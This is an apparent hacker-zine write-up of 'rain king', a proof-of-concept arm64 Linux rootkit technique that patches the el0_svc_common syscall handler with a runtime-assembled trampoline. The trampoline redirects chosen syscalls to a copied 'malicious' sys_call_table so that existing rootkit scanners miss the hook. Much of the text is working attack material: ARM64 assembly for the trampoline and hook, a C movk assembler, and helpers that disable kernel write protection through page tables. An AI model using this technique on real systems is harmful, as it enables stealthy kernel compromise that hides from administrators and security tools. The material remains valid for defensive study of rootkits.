            _        __    _
  _______ _(_)__    / /__ (_)__  ___ _
 / __/ _ `/ / _ \  /  '_// / _ \/ _ `/
/_/  \_,_/_/_//_/ /_/\_\/_/_//_/\_, /
                               /___/   <wintermute - wintermute#0440>
                                       "rain wont drop until i say so"
======================================================================
github.com/3wintermute/arm64_silent_syscall_hook
demonstration: asciinema.org/a/B3Ws8bYdg8kdSUftyJjuEZmEP

featured on tmp.0ut vol3: https://tmpout.sh/3/

----> silent syscall hooking on arm64 linux via patching svc handler <----


#### [introduction] ####
system call hooking on linux is quite trivial. current common techniques include:
- using the kernel ftrace api
- modifying sys_call_table to point to your own table
- modifying addresses in sys_call_table to point to your own code
- patching the syscall entries themselves

unfortunately, even userland rootkit scanners can detect the first 2 methods-
via periodically checking /proc/kallsyms or system.map.
current kernel mode rootkit scanners will easily detect all of these methods.

rain king patches el0_svc_common, which is invoked by the exception handler on a svc
el0_svc_common then redirects execution to the syscall entry via looking up its address in sys_call_table.

rain king then checks the # of the syscall and redirects execution to two different tables -
depending on if the syscall # is marked as hooked.
this leaves the sys_call_table and the entries it points to unmodified.

as far as i am aware, no current rootkit scanner currently detects this,
although doing so could be as trivial as periodically comparing a checksum of kernel code to a base value, perhaps with a trustzone driver.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### [hooking el0_svc_common] ####
{0.} ---- overview ----
since el0_svc_common is blacklisted from ftrace, we will be manually splicing our hook !

splicing a function entails:
- compiling our "hook" (the function to be redirected to when the hook-ee executes)-
  with <trampoline size> nops
- copying the first, <trampoline size> instructions of hook-ee to our hook
- copying our trampoline to the hooked function

when the hook-ee is called, our trampoline will jump to our hook,
the hook can now modify the arguments of the hook-ee.
once the hook is finished, it will jump to the hooked function entry + <trampoline size>.

{0.1.} layout of things post hook installation
            ---------------------------------
            | el0_svc_common entry:         |
            | 0x0 --------------------------|
            | load el0_svc_common_hook addr | <- code (see note) over written by our trampoline
    ------- | jmp el0_svc_common_hook       |
    |       | ----------------------------- |
    |       | 0x14 -------------------------| <--------
    |       | el0_svc_common body           |         |
    |       ---------------------------------         |
    |                                                 |
    |       ---------------------------------------   |
    ------> | el0_svc_common_hook entry:          |   |
            | 0x0 --------------------------------|   |
            | el0_svc_common code                 |   |   <- code (see note) copied from el0_svc_common
            | nop                                 |   |
            | nop                                 |   |   <- nops just to be safe we dont overwrite our actual hook code
            | ...                                 |   |
            | ------------------------------------|   |
            | 0x14 -------------------------------|   |
            | mess with arguments                 |   |   <- check syscall #, set sys_call_table to malicious table if its a hooked syscall
            | jump to el0_svc_common entry + 0x14 | ---
            ---------------------------------------

>>note: as you will soon see, the trampoline will need to be 5 instructions long,
        and since instructions on arm64 are 4 bytes,
        we will need to copy 0x14 bytes of instructions at the start of el0_svc_common.
        (which will mostly be saving callee-saved registers on the stack)

{1.} ---- copying sys_call_table ----
we will begin by calling vmalloc (since sys_call_table can span multiple pages and must be page aligned) on a new table,
and copying the original table into it. this will be our "malicious" table that we will re-direct hooked syscalls to.

>>note: see copy_sys_call_table.h

{2.} ---- disabling write-protect via pagetable ----
since we need to write to both el0_svc_common, and el0_svc_common_hook, and both exist in write-protected memory.
we will get the page table entry for both functions and then set the write bit in the entry like so:

    pte_flip_write_protect(page_from_virt(el0_svc_common_hook_ptr));
    pte_flip_write_protect(page_from_virt(el0_svc_common_ptr));

once again, this is simple enough with the wrappers i provided in set_page_flags.c.
>>note: (see the notes on helpers section for details on how this works)

{3.} ---- stop_machine ----
to repeat the wise words of a friend,
it would cause "horrific crashes" if an interrupt were to... interrupt our copying and execute el0_svc_common,
or if we were to copy our trampoline while a CPU is mid-execution in el0_svc_common.
to prevent this, we will use stop_machine. ill let the documentation speak for itself:

        * stop_machine: freeze the machine on all CPUs and run this function
        * @fn: the function to run
        * @data: the data ptr for the @fn()
        * @cpus: the cpus to run the @fn() on (NULL = any online cpu)
        *
        * Description: This causes a thread to be scheduled on every cpu,
        * each of which disables interrupts.  The result is that no one is
        * holding a spinlock or inside any other preempt-disabled region when
        * @fn() runs.
        *
        * This can be thought of as a very heavy write lock, equivalent to
        * grabbing every spinlock in the kernel.

in hook.c we call copy_shellcode_sync, the function that copies the trampoline with stop_machine
pretty overkill, huh.

{3.} ---- JIT assembling shellcode ----
as i was writing the trampoline shellcode, i ran into an issue.
in order to jump our hook, we need to load its address,
due to KASLR, we have no idea what the address of our hook is at compile time.

well the only solution to this is to assemble the trampoline shellcode AT RUNTIME !
this is actually easier than it sounds.
since instructions are 32 bits, loading a 64 bit address as an immediate is out of the question so we have two options:
>>note:for the examples we are loading the address 0xffff12345678abcd into x0

    - copy the address with our shellcode and then do a pc-relative load (which i have not actually tested lol):

        ldr x0, =addr      ; load pointer to symbol addr
        ldr x0, [x0]       ; dereference
        b skip             ; skip over address value
        addr: .dword 0xffff12345678abcd     ; dword storing address to load
        skip:

    - load the address using immediate values 16 bits at a time with shifts-

        movk x0, #0xabcd
        movk, x0, #0x5678, lsl #16
        movk, x0, #0x1234, lsl #32
        movk x0, #0xffff, lsl #48

i choose the latter option out of laziness, since i only need to write an assembler for on instruction, movk.

the movk instruction is encoded as such:
---------------------------------------------------------------------------
| 0 | 1 1 1 0 0 1 0 1 | 0 0 | 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 | 0 0 0 0 0 |
---------------------------------------------------------------------------
| sf| opc             | hw  | imm16                           | rd        |
---------------------------------------------------------------------------

opc: opcode of movk
imm16: 16 bit immediate to load
hw: shift / 16
rd: destination register

the assembler itself is very simple, we simply shift all parameters to their correct positions,
then OR them with each other.
to assemble an absolute load of a 64 bit address, we use bitmasks to break the address into 16 bit chunks,
and then assemble movk with incremented shifts.

    uint32_t assemble_movk(uint32_t imm16, uint32_t hw, uint32_t rd) {
        return 0xf2800000 | (imm16 << 5) | (hw << 21) | rd;
    }

    void assemble_absolute_load(uint32_t rd, uintptr_t addr, uint32_t *arr) {
        arr[0] = cpu_to_le32(assemble_movk(addr & 0xffff, 0b0, rd));
        arr[1] = cpu_to_le32(assemble_movk((addr & 0xffff0000) >> 16, 0b1, rd));
        arr[2] = cpu_to_le32(assemble_movk((addr & 0xffff00000000) >> 32, 0b10, rd));
        arr[3] = cpu_to_le32(assemble_movk((addr & 0xffff000000000000) >> 48, 0b11, rd));
    }

>>note: see assembler.c

{4.} ---- copying shellcode ----
now we are free to copy away ! first saving the first few instructions of el0_svc_common to el0_svc_common_hook
then copying our shellcode (trampoline) to el0_svc_common.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### [el0_svc_common_hook] ####
{0.} ---- disassembly of el0_svc_common + source ----
okay, now that we have successfully hooked el0_svc_common, how are we going to redirect the table ?

initially, i looked at the kernel source code:

    static void invoke_syscall(struct pt_regs *regs, unsigned int scno,
               unsigned int sc_nr,
               const syscall_fn_t syscall_table[])
    {
        ...
        if (scno < sc_nr) {
            syscall_fn_t syscall_fn;
            syscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];
            ret = __invoke_syscall(regs, syscall_fn);
        } else {
            ret = do_ni_syscall(regs, scno);
        }

        syscall_set_return_value(current, regs, 0, ret);
    }

    -----------------------------------------------------------------------------

    static void el0_svc_common(struct pt_regs *regs, int scno, int sc_nr,
                   const syscall_fn_t syscall_table[])
    {
        ...
        invoke_syscall(regs, scno, sc_nr, syscall_table);
        ...
    }

looking at this, i thought to just

    ldr x12, =new_sys_call_table_ptr
    ldr x3, [x12]       ; overwrite third argument (x3) with new_sys_call_table_ptr

since syscall_table is passed as the third argument, it should be in x3
however, this did not work. so i intentionally caused a null pointer deference in order to generate a stack trace-
and find exactly where execution jumps to the syscall entry

    Call trace:
    ...
    [   37.919103]  __arm64_sys_finit_module+0x2c/0x38
    [   37.919104]  el0_svc_common.constprop.0+0xf4/0x200
    [   37.919105]  el0_svc_handler+0x38/0xa8
    [   37.919105]  el0_svc+0x10/0x180
    ...

aha ! the return address is at 0xf4, so 0xf0 will be where it jumps.
dumping el0_svc_common with pr_info and then disassembling it we see:

    0x0000000000000000:  0C 3A 92 F2    movk x12, #0x91d0c
    0x0000000000000004:  AC 3C BC F2    movk x12, #0xe1e5, lsl #16
    0x0000000000000008:  2C 09 D5 F2    movk x12, #0xa849, lsl #32
    0x000000000000000c:  EC FF FF F2    movk x12, #0xffff, lsl #48
    0x0000000000000010:  80 01 1F D6    br   x12                        <- our trampoline !
    0x0000000000000014:  FF 20 03 D5    hint #0x7
    0x0000000000000018:  F4 03 01 2A    mov  w20, w1                    <- saving second argument in w20
    0x000000000000001c:  E0 03 1E AA    mov  x0, x30
    0x0000000000000020:  F6 03 02 AA    mov  x22, x2                    <- saving third argument in x22
    ...
    0x00000000000000ec:  C1 7A 74 F8    ldr  x1, [x22, x20, lsl #3]     <- jump to syscall entry (offset in stack trace)
    0x00000000000000f0:  20 00 3F D6    blr  x1
    0x00000000000000f4:  01 41 38 D5    mrs  x1, sp_el0

it seems invoke_syscall is inlined, and the address of the syscall entry-
is calculated with x22 (storing the address of sys_call_table) and x20 (storing the syscall number).
we also see that initiall, w1 is stored in w20 and x2 in x22, so the sys_call_table must be in x2 initially !

{1.} ---- el0_svc_common_hook ----
now that we know what arguments to overwrite, writing our hook code is trivial

    ldr x12, =hooked_syscall_number
    ldr x12, [x12]      ; load the hooked_syscall_number
    cmp x1, x12         ; check if current syscall number is hooked number (see note below)

    do_not_redirect_table:
    ldr x12, =el0_svc_common_ptr
    ldr x12, [x12]
    add x12, x12, #0x14     ; add offset of shellcode to prevent infinite loop
    br x12      ; jump back to el0_svc_common

    redirect_table:
    ldr x12, =new_sys_call_table_ptr
    ldr x2, [x12]       ; overwrite x2 with new_sys_call_table
    b do_not_redirect_table

>>note: in the future checking a list of syscalls to hook will be implemented,
        but as this is a very hacked-together POC, it is not currently.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### [notes on helpers] ####
{0.} ---- resolve_kallsyms.h ----
use kprobes to resolve the address of kallsyms_lookup_name since it is no longer exported,
then use kallsyms_lookup_name to lookup any unexported symbols.
this is cleaner than calling a usermode helper to parse /proc/kallsyms.

functions:
    uintptr_t kallsyms_lookup_name_(const char *symbol_name)
    arguments:
        symbol_name: unexported symbol to lookup
    returns:
        uintptr_t containing address of symbol

{1.} ---- set_page_flags.h ----
since arm64 doesnt have an equivalent to the cr0 trick on x86,
write-protection is disabled through the kernel pagetable.

functions:
    pte_t *page_from_virt(uintptr_t addr)
    arguments:
        addr: kernel virtual address
    returns:
        pointer to the page table entry associated with addr

    void pte_flip_write_protect(pte_t *ptep)
    arguments:
        ptep: pointer to page table entry
    returns:
        void, sets the writable bit in the pte pointed to

{2.} ---- copy_sys_call_table ----
literally just a vmalloc and memcpy, nothing much to see here

functions:
    void *copy_sys_call_table(void *table)
    arguments:
        table: pointer to sys_call_table
    returns:
        pointer to a new sys_call_table identical to the first

    void free_new_sys_call_table(void *table)
    arguments:
        table: pointer to table allocated with copy_sys_call_table
    returns:
        void, call vfree on table
